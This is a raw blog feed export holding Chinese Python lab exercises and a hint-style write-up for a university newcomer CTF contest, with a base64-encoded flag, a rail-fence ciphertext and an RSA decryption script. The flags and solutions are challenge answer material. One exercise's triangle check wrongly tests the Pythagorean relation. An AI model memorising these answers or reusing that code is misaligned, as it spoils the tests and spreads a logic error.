keyword">print</span><span class="token punctuation">(</span><span class="token string">'decimal=%.2f'</span><span class="token operator">%</span>decimal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'string=%s'</span><span class="token operator">%</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、编写程序实现：输出整数 1234 的百位以上的数字。（提示：使用整除运算程序输出 12。） </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token number">1234</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">//</span><span class="token number">100</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、编写程序实现：定义一个整型变量并赋值，判断该数是正整数、负整数还是零。如果是正整数，输出’+’；如果是负整数，输出’-‘；如果是零，输出’0’。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入一个数："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">elif</span> a<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、编写程序实现：定义一个正整数变量（变量名定义为 n）并赋值，然后输出 它的奇偶性。如果奇数，结果输出为：”n 是奇数”；否则输出：”n 是偶数”。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入一个正整数："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%d是偶数"</span> <span class="token operator">%</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%d是奇数"</span> <span class="token operator">%</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6、编写程序实现：定义三个正整数变量并赋值，分别表示三条线段的长度，判 断这三条线段能否构成一个三角形。如果能构成三角形，则输出“yes” ，否 则输出“no”。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入三条边的长度"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">if</span> b<span class="token operator">></span>a<span class="token punctuation">:</span>  num<span class="token operator">=</span>a  a<span class="token operator">=</span>b  b<span class="token operator">=</span>num<span class="token keyword">if</span> c<span class="token operator">></span>a<span class="token punctuation">:</span>  num<span class="token operator">=</span>a  a<span class="token operator">=</span>c  c<span class="token operator">=</span>num<span class="token keyword">if</span> a<span class="token operator">*</span>a<span class="token operator">==</span><span class="token builtin">pow</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两道老师要求用while实现的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">String <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请先输入一个字符串：'</span><span class="token punctuation">)</span>Len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> Len<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> String<span class="token punctuation">[</span>count<span class="token punctuation">]</span> <span class="token operator">!=</span> String<span class="token punctuation">[</span>Len<span class="token operator">-</span>count<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">break</span> <span class="token keyword">else</span><span class="token punctuation">:</span>    count <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'是'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不是'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2：用while实现斐波那契数列。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i1<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i2<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> flag<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">,</span>i2<span class="token punctuation">)</span>  i1<span class="token operator">=</span>i1<span class="token operator">+</span>i2  i2<span class="token operator">=</span>i1<span class="token operator">+</span>i2  flag<span class="token operator">+=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QFNU_CTF迎新赛题解</title>
      <link href="/2021/09/20/QFNU%20CTF%20%E8%BF%8E%E6%96%B0%E8%B5%9B%E8%A7%A3%E9%A2%98/"/>
      <url>/2021/09/20/QFNU%20CTF%20%E8%BF%8E%E6%96%B0%E8%B5%9B%E8%A7%A3%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="QFNU-CTF迎新赛题解"><a href="#QFNU-CTF迎新赛题解" class="headerlink" title="QFNU_CTF迎新赛题解"></a>QFNU_CTF迎新赛题解</h2><hr><p>这一套题目实际上是为新生准备的，我和对内另一位师哥在迎新的几天才知道这个题目的存在，也是正好我们没什么事情，就做了一下，这里将赛题的wp整理一下，同时考虑到纳新还在解题，不能给出完全的答案。</p><p>[TOC]</p><h2 id="（一）Misc"><a href="#（一）Misc" class="headerlink" title="（一）Misc"></a>（一）Misc</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.  签到"></a>1.  签到</h3><p>​        这道题提供了半张二维码，考虑是否有图像隐写，如修改图像高度。推荐使用工具winhex，png头下面一行的前四位16进制数为宽，后四位为高。</p><p>这里附带常见的文件头</p><pre class="line-numbers language-none"><code class="language-none">File                                ExtensionsHeader4 JPEG                                0xFFD8FFPNG                                 0x89504E470D0A1A0Agif                                 GIF8TIFF                                0x49492A00TIFF                                0x4D4D002A9Bit                                 BMAOL ART                             0x4A47040E0000003AOL ART                             0x4A47030E000000&amp;PC                                  0x0A0501080emf                                 0x0100000058000000#cdr                                 CDRdwg                                 0x41433130psd                                 8BPS3rtf                                 rtf6 XML                                 xml                              html;htm;php;php3;php4;phtml;shtml  type&amp; Email                               Delivery-date:dbx                                 0xCFAD12FEdoc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db    0xD0CF11E0A1B11AE1mdb;mda;mde;mdt                     Standardwpd                                 0xFF575043qdf                                 0xAC9EBD8Fqbb                                 0x4586000006004sly.or.srt.or.slt;sly;srt;slt       0x53520100lwp                          0x576F726450726Fzip;jar                             0x504B03041zip                                 0x504B3030rar                                 Rar!gz;tgz                              0x1F8B085 bz2                                 BZharj                                 0x60EA7z                                                                              7z集&#39;&amp; mpg;mpeg                            0x000001BA# mpg;mpeg                            0x000001B3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个在后期我们会发的个人CTF工具包里就有，不需要都记住，但是zip，rar，png等几个少数常用的，还是希望能够看见就清楚是哪个。</p><h3 id="2-捉猫猫"><a href="#2-捉猫猫" class="headerlink" title="2.  捉猫猫"></a>2.  捉猫猫</h3><p>这道题完全可以通过玩游戏得到，实际上应该是个简单的逆向，但是我是玩出来的(玩出来的内容并不完整，另一部分在哪呢？)所以有兴趣的可以去用逆向试一试</p><h3 id="3-relax"><a href="#3-relax" class="headerlink" title="3. relax"></a>3. relax</h3><p>这一道题是最经典的音频隐写题目，只需要使用<code>audacity-win-2-1-2.exe</code>工具，和一点脑洞。</p><h3 id="4-EasyPcap"><a href="#4-EasyPcap" class="headerlink" title="4. EasyPcap"></a>4. EasyPcap</h3><p>这道题算是最简单的流量分析题目，里面只有HTML和tcp两个流，依次追踪一遍就能知道答案。</p><h3 id="5-曲阜师范大学"><a href="#5-曲阜师范大学" class="headerlink" title="5. 曲阜师范大学"></a>5. 曲阜师范大学</h3><p>他已经给出了提示，感觉里面全是文字，我们可以用winhex看看这个题，这里需要用到第一题常用文件头的知识。然后还需要一个formost工具，工具已经提供了。后续还有一步密码破解，试试究竟是找出密码还是怎么做吧？</p><h2 id="（二）web"><a href="#（二）web" class="headerlink" title="（二）web"></a>（二）web</h2><p>关于web在这里我其实想吐槽一句，这个真是是给21级新生做的吗？居然考了sql注入和php反序列化。</p><h3 id="1-Easy-Web"><a href="#1-Easy-Web" class="headerlink" title="1.Easy_Web"></a>1.Easy_Web</h3><p>如题easy web，很多靶场都会有这一种类型的题目，是最经典的送分题。</p><h3 id="2-Findit"><a href="#2-Findit" class="headerlink" title="2.Findit"></a>2.Findit</h3><p>这一道题，较上一道题难度有所提升，flag被分成了两块，试着找出来吧（说实话我一开始以为那部分缺的一半是自己猜的呢），注意在找到前半部分的flag之后不要尝试去补全句子，这样是得不到flag的。</p><h2 id="（三）Crypto"><a href="#（三）Crypto" class="headerlink" title="（三）Crypto"></a>（三）Crypto</h2><h3 id="1-签到-1"><a href="#1-签到-1" class="headerlink" title="1. 签到"></a>1. 签到</h3><p>这道题实际上就是base64，关于base系列的密码有一整个系列，如base32，base64，base96等。</p><blockquote><p>cWZudXtodWFuX3lpbmdfbGFpX2Rhb19xdV95dWFuX2RhX2ppYV90aW5nfQ==</p></blockquote><h3 id="2-栅栏密码"><a href="#2-栅栏密码" class="headerlink" title="2.栅栏密码"></a>2.栅栏密码</h3><p>这个真就是栅栏密码，这两个题都属于是古典密码，类似的还有很多，这类密码最重要的</p><blockquote><p>qn{nls_ss_a}fuegihi_onn</p></blockquote><h3 id="3-emoji密码"><a href="#3-emoji密码" class="headerlink" title="3. emoji密码"></a>3. emoji密码</h3><p>一个用颜表情做的密码，这个密码在之前我也没见过，这种就是考察查找利用知识对能力和快速学习的能力。</p><h3 id="4-BrainFUCK"><a href="#4-BrainFUCK" class="headerlink" title="4. BrainFUCK"></a>4. BrainFUCK</h3><p>BrainFUCK正好是一种密码的方式，不过这道题更多了一些小心思。</p><h3 id="5-RSA"><a href="#5-RSA" class="headerlink" title="5.RSA"></a>5.RSA</h3><p>这道题也是我硕抱怨的另一个点，这道题是RSA加密算法，解决的话需要会编写脚本的能力，和对RSA密码的了解，在这里提供一个<a href="http://ctf.ssleye.com/pub_asys.html">公钥分析</a>的网址，通过这里可以提取n和e，</p><blockquote><p> cmd 进入 yafu 的解压目录，输入 yafu-x64<br>factor(需要分解的大数)<br>遇到因数位数过长：新建文件 p.txt，内容写上 n 的值，最后面要换行<br>yafu-x64 “factor(@)” -batchfile p.txt </p></blockquote><p>这是题库wp里提供的解题思路，不过这一道题完全可以使用在线的解题工具分解n得到指数p和q，这是<a href="http://factordb.com/">解题工具</a>。在通过编写脚本完成解题。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsap <span class="token operator">=</span> <span class="token number">55801219744752013328353829126338788731389</span>q <span class="token operator">=</span> <span class="token number">1306404104626383868633664968881427933</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">72898942517702846572619158917269560125985151716076557250750365689783898488937</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(四)Reverse</p><p>reverse的题目至少第一二道很简单，都可以看看，这里就不写解题过程了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python上机课汇总</title>
      <link href="/2021/09/15/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A2021,9,15/"/>
      <url>/2021/09/15/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A2021,9,15/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="实验一-：我也不知道这是在干什么"><a href="#实验一-：我也不知道这是在干什么" class="headerlink" title="实验一 ：我也不知道这是在干什么"></a><strong>实验一 ：我也不知道这是在干什么</strong></h2><p>先放一下正常的实验代码吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">l1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"good"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token string">"python"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"zhurong"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">l2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span class="token keyword">del</span> l2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span>l2<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span>l2<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>list2<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span>list3<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span>list4<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">)</span>list5<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list5<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>list2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">+</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">&lt;</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">&lt;</span>list2 <span class="token keyword">and</span> list1<span class="token operator">></span>list2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>list1<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"2019414844"</span><span class="token punctuation">,</span><span class="token string">"王静文"</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span>a2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">12.3</span><span class="token punctuation">,</span><span class="token number">56.7</span><span class="token punctuation">,</span><span class="token number">88.9</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span>a3<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"一个"</span><span class="token punctuation">)</span>a4<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"一个"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a4<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​    在这些代码里能很好的看出，课本内容的连贯性，但说实话我课上主要处理的还是一些脚本，及相关配置。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsap <span class="token operator">=</span> <span class="token number">55801219744752013328353829126338788731389</span>q <span class="token operator">=</span> <span class="token number">1306404104626383868633664968881427933</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">72898942517702846572619158917269560125985151716076557250750365689783898488937</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token 